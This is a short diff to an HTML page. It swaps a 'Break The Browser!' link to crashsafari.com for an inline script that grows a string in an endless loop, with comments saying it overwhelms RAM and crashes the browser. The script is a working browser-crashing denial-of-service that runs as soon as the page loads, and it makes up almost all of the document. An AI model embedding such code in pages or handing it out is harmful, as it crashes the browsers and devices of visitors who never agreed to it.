@@ -1,5 +1,9 @@
-<!-- Source: https://www.quora.com/What-is-your-smallest-piece-of-code-that-can-crash-the-computer/answer/Mohamed-Awad-31?srid=u2HNX -->
-<!-- The site contains JavaScript code which generates an infinite string of characters that overwhelms the device's memory. 
-     May not work on some browsers. -->
+<!-- Intro- Creates a super big string and overwhelms the RAM. -->
+<!-- Details- http://stackoverflow.com/questions/10965987/how-do-you-force-chrome-pages-tabs-to-crash-using-javascript -->
 
-<a href="http://crashsafari.com">Break The Browser!</a>
+<script>
+var txt = "a";
+while(1){
+    txt += "a";
+}
+</script>
